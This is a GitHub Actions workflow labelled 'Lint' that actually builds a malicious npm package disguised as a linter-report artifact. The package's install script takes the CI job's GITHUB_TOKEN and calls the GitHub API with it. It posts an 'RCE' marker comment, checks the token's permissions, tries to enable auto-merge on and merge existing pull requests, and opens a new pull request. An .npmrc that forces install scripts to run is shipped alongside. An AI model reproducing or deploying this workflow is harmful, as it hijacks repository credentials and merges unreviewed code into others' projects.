---
name: Lint
on:
  pull_request:
    branches: [main]

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - name: Build attacker-chosen linter-report artifact
        env:
          PR_NUMBER: ${{ github.event.pull_request.number }}
        run: |
          set -e
          mkdir -p pkg/package
          cat > pkg/package/package.json <<'JSON'
          {"name":"pwn","version":"1.0.0","main":"index.js","scripts":{"install":"node index.js install","postinstall":"node index.js postinstall"}}
          JSON
          cat > pkg/package/index.js <<'JS'
          const fs = require('fs'), path = require('path');
          const base = process.env.INIT_CWD || process.cwd();
          const token = process.env.GITHUB_TOKEN || '';
          const repo = process.env.GITHUB_REPOSITORY || '';
          const runId = process.env.GITHUB_RUN_ID || '';
          let pr = '0';
          try { pr = fs.readFileSync(path.join(base, 'pr-number.txt'), 'utf8').trim(); } catch (e) {}
          const log = (...a) => console.log('[PWN] ' + a.map(x => typeof x === 'string' ? x : JSON.stringify(x)).join(' '));
          async function api(method, url, body, raw) {
            try {
              const r = await fetch('https://api.github.com' + url, {
                method,
                headers: { authorization: 'Bearer ' + token, accept: 'application/vnd.github+json',
                           'content-type': 'application/json', 'user-agent': 'pwn-probe' },
                body: body ? JSON.stringify(body) : undefined
              });
              const text = await r.text();
              return { status: r.status, full: text, text: text.slice(0, 300) };
            } catch (e) { return { status: 'EXC', full: String(e), text: String(e).slice(0, 200) }; }
          }
          async function gql(query, variables) { return api('POST', '/graphql', { query, variables }); }
          async function main() {
            log('MARKER v4 run=' + runId + ' token_len=' + token.length);
            const p = {};
            const c = await api('POST', '/repos/' + repo + '/issues/' + pr + '/comments',
              { body: '<!-- PWN-RCE --> workflow_run RCE v4. run=' + runId + ' token_len=' + token.length });
            p.comment = { status: c.status, id: (() => { try { return JSON.parse(c.full).id; } catch (e) { return 0; } })() };
            const q = await gql('query($o:String!,$n:String!){repository(owner:$o,name:$n){autoMergeAllowed,squashMergeAllowed,mergeCommitAllowed,rebaseMergeAllowed,viewerPermission}}',
              { o: repo.split('/')[0], n: repo.split('/')[1] });
            p.repoGraphql = q.text;
            const pr1 = await api('GET', '/repos/' + repo + '/pulls/1');
            let node1 = ''; try { node1 = JSON.parse(pr1.full).node_id; } catch (e) {}
            if (node1) {
              const am = await gql('mutation($id:ID!){enablePullRequestAutoMerge(input:{pullRequestId:$id,mergeMethod:MERGE}){pullRequest{autoMergeRequest{enabledBy{login}}}}}', { id: node1 });
              p.autoMergePr1 = { status: am.status, text: am.text };
              const mg = await gql('mutation($id:ID!){mergePullRequest(input:{pullRequestId:$id,mergeMethod:MERGE}){pullRequest{merged}}}', { id: node1 });
              p.gqlMergePr1 = { status: mg.status, text: mg.text };
            }
            const pr2 = await api('GET', '/repos/' + repo + '/pulls/2');
            let node2 = ''; try { node2 = JSON.parse(pr2.full).node_id; } catch (e) {}
            if (node2) {
              const am2 = await gql('mutation($id:ID!){enablePullRequestAutoMerge(input:{pullRequestId:$id,mergeMethod:MERGE}){pullRequest{autoMergeRequest{enabledBy{login}}}}}', { id: node2 });
              p.autoMergePr2 = { status: am2.status, text: am2.text };
            }
            const np = await api('POST', '/repos/' + repo + '/pulls', { title: 'probe: benign', head: 'lazyhacker6:pwn/benign', base: 'main', body: 'probe', maintainer_can_modify: false });
            p.createPrNoCollab = { status: np.status, text: np.text };
            log('RESULT ' + JSON.stringify(p));
            if (p.comment.id) {
              await api('PATCH', '/repos/' + repo + '/issues/comments/' + p.comment.id,
                { body: '<!-- PWN-PROBES-V4 -->\n```json\n' + JSON.stringify(p, null, 1) + '\n```' });
            }
          }
          if (process.argv[2] === 'install') { main(); } else { console.log('[PWN] postinstall noop'); }
          JS
          tar -czf pwn-1.0.0.tgz -C pkg package
          printf '{"name":"root","version":"1.0.0","private":true,"dependencies":{"pwn":"file:./pwn-1.0.0.tgz"}}' > package.json
          printf 'dangerously-allow-all-scripts=true\nforeground-scripts=true\n' > .npmrc
          printf 'report authored by the fork PR\n' > linter-report.txt
          printf '%s' "$PR_NUMBER" > pr-number.txt
      - uses: actions/upload-artifact@v4
        with:
          name: linter-report
          include-hidden-files: true
          path: |
            linter-report.txt
            pr-number.txt
            .npmrc
            package.json
            pwn-1.0.0.tgz
          if-no-files-found: error
